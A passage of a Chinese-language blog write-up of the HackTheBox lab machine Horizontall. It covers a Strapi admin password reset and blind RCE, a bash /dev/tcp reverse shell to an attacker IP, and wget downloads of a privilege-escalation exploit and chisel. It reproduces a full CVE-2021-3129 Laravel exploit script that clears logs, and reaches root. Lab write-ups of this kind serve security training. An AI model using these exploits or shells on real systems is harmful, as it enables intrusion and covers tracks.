+<p>这是一个组合漏洞，首先会重置用户的密码，虽然我不知道是哪个，看目录像是admin，重置成功后便会生成返回一个JWT Token，然后带着令牌去请求/admin/plugins/install执行cmd，Rember this is a blind RCE don’t expect to see output。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; python3 50239.py http://api-prod.horizontall.htb<br>[+] Checking Strapi CMS Version running<br>[+] Seems like the exploit will work!!!<br>[+] Executing exploit<br><br><br>[+] Password reset was successfully<br>[+] Your email is: admin@horizontall.htb<br>[+] Your new credentials are: admin:SuperStrongPassword1<br>[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjUyNzYzMDk0LCJleHAiOjE2NTUzNTUwOTR9.0WODcG0DqsHwETYjBNYwk9eVrLdIcY1xRV-rbkyDpFQ<br><br><br>$&gt; <span class="hljs-built_in">id</span><br>[+] Triggering Remote code executin<br>[*] Rember this is a blind RCE don<span class="hljs-string">&#x27;t expect to see output</span><br><span class="hljs-string">&#123;&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[&#123;&quot;messages&quot;:[&#123;&quot;id&quot;:&quot;An error occurred&quot;&#125;]&#125;]&#125;</span><br><span class="hljs-string">$&gt; bash -c &#x27;</span>bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[+] Triggering Remote code executin</span><br><span class="hljs-string">[*] Rember this is a blind RCE don&#x27;</span>t expect to see output<br><br></code></pre></td></tr></table></figure>
+
+<h4 id="Reverse-shell："><a href="#Reverse-shell：" class="headerlink" title="Reverse shell："></a>Reverse shell：</h4><p>有对user目录的读取权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 36446<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1787): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>strapi@horizontall:~/myapi$ <br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span><br>api    config      favicon.ico   package.json       public<br>build  extensions  node_modules  package-lock.json  README.md<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span> /home/<br>developer<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">cat</span> /home/developer/user.txt <br>e1...................................<br></code></pre></td></tr></table></figure>
+
+<p>密码无法复用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~/myapi$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> strapi: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> strapi: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> strapi: <br>sudo: 3 incorrect password attempts<br>strapi@horizontall:~/myapi$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:/$ find /  -perm /6000 2&gt;/dev/null                 <br>/sbin/pam_extrausers_chkpwd<br>/sbin/unix_chkpwd<br>/usr/bin/mlocate<br>/usr/bin/sudo<br>/usr/bin/newgidmap<br>/usr/bin/bsd-write<br>/usr/bin/traceroute6.iputils<br>/usr/bin/newuidmap<br>/usr/bin/gpasswd<br>/usr/bin/chage<br>/usr/bin/at<br>/usr/bin/chfn<br>/usr/bin/passwd<br>/usr/bin/wall<br>/usr/bin/crontab<br>/usr/bin/ssh-agent<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/expiry<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/x86_64-linux-gnu/utempter/utempter<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/snapd/snap-confine<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/local/share/fonts<br>/usr/local/lib/python3.6<br>/usr/local/lib/python3.6/dist-packages<br>/usr/local/lib/python2.7<br>/usr/local/lib/python2.7/dist-packages<br>/usr/local/lib/python2.7/site-packages<br>/var/mail<br>/var/log/journal<br>/var/log/journal/3cc9504f7ded4867a4c8ca16476b1378<br>/var/local<br>/bin/fusermount<br>/bin/ping<br>/bin/su<br>/bin/umount<br>/bin/mount<br>strapi@horizontall:/$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="CVE-2021-2043："><a href="#CVE-2021-2043：" class="headerlink" title="CVE-2021-2043："></a>CVE-2021-2043：</h4><p>这个漏洞是新漏洞，不能作数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ wget http://10.10.16.7/CVE-2021-2043.py<br>--2022-05-17 05:06:37--  http://10.10.16.7/CVE-2021-2043.py<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: ‘CVE-2021-2043.py’<br><br>CVE-2021-2043.py    100%[===================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0.1s    <br><br>2022-05-17 05:06:38 (24.6 KB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]<br><br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py  myapi<br>strapi@horizontall:~$ python3 CVE-2021-2043.py <br><span class="hljs-comment"># ID</span><br>sh: 1: ID: not found<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1001(strapi)<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<h4 id="CVE-2021-3129："><a href="#CVE-2021-3129：" class="headerlink" title="CVE-2021-3129："></a>CVE-2021-3129：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ netstat -ano<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0    144 10.10.11.105:36446      10.10.16.7:9001         ESTABLISHED on (0.34/0/0)<br>tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)<br>tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)<br>udp        0      0 10.10.11.105:50522      1.1.1.1:53              ESTABLISHED off (0.00/0/0)<br></code></pre></td></tr></table></figure>
+
+<p>3306应该是个数据库，1337是欢迎页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ curl 127.0.0.1:1337<br>&lt;!doctype html&gt;<br><br>&lt;html&gt;<br>  &lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span> /&gt;<br>    &lt;title&gt;Welcome to your API&lt;/title&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;<br>    &lt;style&gt;<br>    &lt;/style&gt;<br>  &lt;/head&gt;<br>  &lt;body lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>    &lt;section&gt;<br>      &lt;div class=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;<br>        &lt;h1&gt;Welcome.&lt;/h1&gt;<br>      &lt;/div&gt;<br>    &lt;/section&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>strapi@horizontall:~$ <br></code></pre></td></tr></table></figure>
+
+<p>8000端口会返回很多HTML代码，应该是个HTTP服务，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ./chisel server -p 9000 --reverse<br>2022/05/17 13:15:32 server: Reverse tunnelling enabled<br>2022/05/17 13:15:32 server: Fingerprint QxD29/LAFhRG/uyK4saRO5hEnE3XGwEaGM7N5M5sAf0=<br>2022/05/17 13:15:32 server: Listening on http://0.0.0.0:9000<br>2022/05/17 13:20:00 server: session<span class="hljs-comment">#1: tun: proxy#R:9002=&gt;localhost:8000: Listening</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ wget http://10.10.16.7/chisel<br>--2022-05-17 05:15:11--  http://10.10.16.7/chisel<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 8077312 (7.7M) [application/octet-stream]<br>Saving to: ‘chisel’<br><br>chisel              100%[===================&gt;]   7.70M  2.15MB/s    <span class="hljs-keyword">in</span> 4.4s    <br><br>2022-05-17 05:15:16 (1.75 MB/s) - ‘chisel’ saved [8077312/8077312]<br><br>strapi@horizontall:~$ ./chisel client 10.10.16.6:9000 R:9002:localhost:8000<br>bash: ./chisel: Permission denied<br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span><br>chisel  CVE-2021-2043.py  myapi<br>strapi@horizontall:~$ <span class="hljs-built_in">chmod</span> +x ./chisel <br>strapi@horizontall:~$ ./chisel client 10.10.16.7:9000 R:9002:localhost:8000<br>2022/05/17 05:19:57 client: Connecting to ws://10.10.16.7:9000<br>2022/05/17 05:19:59 client: Connected (Latency 144.170165ms)<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220517132208419.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517132208419" style="zoom:200%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit Laravel    <br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  Path<br>--------------------------------------------------------------------------- ---------------------------------<br>Aimeos Laravel ecommerce platform 2021.10 LTS - <span class="hljs-string">&#x27;sort&#x27;</span> SQL injection       | php/webapps/50538.txt<br>Laravel - <span class="hljs-string">&#x27;Hash::make()&#x27;</span> Password Truncation Security                      | multiple/remote/39318.txt<br>Laravel 8.4.2 debug mode - Remote code execution                           | php/webapps/49424.py<br>Laravel Administrator 4 - Unrestricted File Upload (Authenticated)         | php/webapps/49112.py<br>Laravel Log Viewer &lt; 0.13.0 - Local File Download                          | php/webapps/44343.py<br>Laravel Nova 3.7.0 - <span class="hljs-string">&#x27;range&#x27;</span> DoS                                           | php/webapps/49198.txt<br>Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)                   | macos/local/50591.py<br>PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forg | php/webapps/50525.txt<br>PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote C | linux/remote/47129.rb<br>UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                  | php/webapps/48166.txt<br>UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload         | php/webapps/46389.py<br>--------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+
+<p>searchsploit脚本不是很好用，目标并没有与之相符的日志路径，不过我又找到了以下脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># Send a post request with a specific viewFile value, returning HTTP response</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewfile=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    data = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>        <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;whateverYouWant&quot;</span>,<br>            <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>    &#125;<br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewfile<br>    resp = requests.post(url, json=data, headers=headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-comment"># Generate payload and return it as text</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">chain=<span class="hljs-string">&#x27;&#x27;</span>, command=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-comment"># Ensure that we have PHPGGC in current directory, if not we&#x27;ll clone it</span><br>    <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;phpggc&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] PHPGGC found. Generating payload and deploy it to the target&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] PHPGGC not found. Cloning it&quot;</span>)<br>        os.system(<span class="hljs-string">&quot;git clone https://github.com/ambionics/phpggc.git&quot;</span>)<br>    payload = subprocess.getoutput(<br>        <span class="hljs-string">r&quot;php -d&#x27;phar.readonly=0&#x27; ./phpggc/phpggc &#x27;%s&#x27; system &#x27;%s&#x27; --phar phar -o php://output | base64 -w0 | &quot;</span><br>        <span class="hljs-string">r&quot;sed -E &#x27;s/./\0=00/g; s/==/=3D=/g; s/$/=00/g&#x27;&quot;</span> % (chain, command))<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-comment"># Clear logs,</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] Trying to clear logs&quot;</span>)<br>    <span class="hljs-keyword">while</span> (send(url,<br>                <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf&quot;</span><br>                <span class="hljs-string">&quot;-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code != <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Logs cleared&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage:   %s &lt;URL&gt; &lt;CHAIN&gt; &lt;CMD&gt;&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/_ignition/execute-solution&quot;</span><br>    chain = sys.argv[<span class="hljs-number">2</span>]<br>    command = sys.argv[<span class="hljs-number">3</span>]<br><br>    <span class="hljs-comment"># Step 1. Clear logs, write the first log entry</span><br>    clear(url)<br>    send(url, <span class="hljs-string">&quot;AA&quot;</span>)<br><br>    <span class="hljs-comment"># Step 3. Write the second log entry with encoded PHAR payload</span><br>    send(url, generate(chain, command))<br><br>    <span class="hljs-comment"># Step 4. Convert log file to a valid PHAR</span><br>    <span class="hljs-keyword">if</span> (send(url,<br>             <span class="hljs-string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64&quot;</span><br>             <span class="hljs-string">&quot;-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code == <span class="hljs-number">200</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Successfully converted logs to PHAR&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Fail to convert logs to PHAR&quot;</span>)<br><br>    <span class="hljs-comment"># Step 5. Trigger PHAR deserialization, extract the output</span><br>    response = send(url, <span class="hljs-string">&quot;phar://../storage/logs/laravel.log&quot;</span>)<br>    result = re.sub(<span class="hljs-string">&quot;&#123;[\s\S]*&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, response.text)<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] PHAR deserialized. Exploited\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] There is no output&quot;</span>)<br><br>    <span class="hljs-comment"># Clear logs</span><br>    clear(url)<br></code></pre></td></tr></table></figure>
+
+<p>利用phpggc生成对应的phar文件→清空laravel.log → 将编码后的字符写入到log中→清除干扰字符→执行phar反序列化.phar反序列化就是可以在<strong>不使用php函数unserialize ()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞</strong>。这个洞很奇怪，在目标机器上是复现不了的，但是端口转发到本地却可以，可能是目标不出网，无法git clone <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc.git%E5%90%A7%EF%BC%9A">https://github.com/ambionics/phpggc.git吧：</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; python3 ./CVE-2021-3129.py http://localhost:9003 Monolog/RCE1 <span class="hljs-built_in">id</span><br>[i] Trying to clear logs<br>[+] Logs cleared<br>[+] PHPGGC found. Generating payload and deploy it to the target<br>[+] Successfully converted logs to PHAR<br>[+] PHAR deserialized. Exploited<br><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><br>[i] Trying to clear logs<br>[+] Logs cleared<br></code></pre></td></tr></table></figure>
+
+<p>弹shell也很怪，以往正常情况是弹不回来的，指定一个端口进行输入命令，还需要指定一个端口监听回显：</p>
+<p><img src="https://www.worldisend.com/img/image-20220517135837450.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517135837450"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Horizontall</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Horizontall/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-FriendZone/" title="HackTheBox-FriendZone">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-FriendZone</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-LaCasaDePapel/" title="HackTheBox-LaCasaDePapel">
+                        <span class="hidden-mobile">HackTheBox-LaCasaDePapel</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
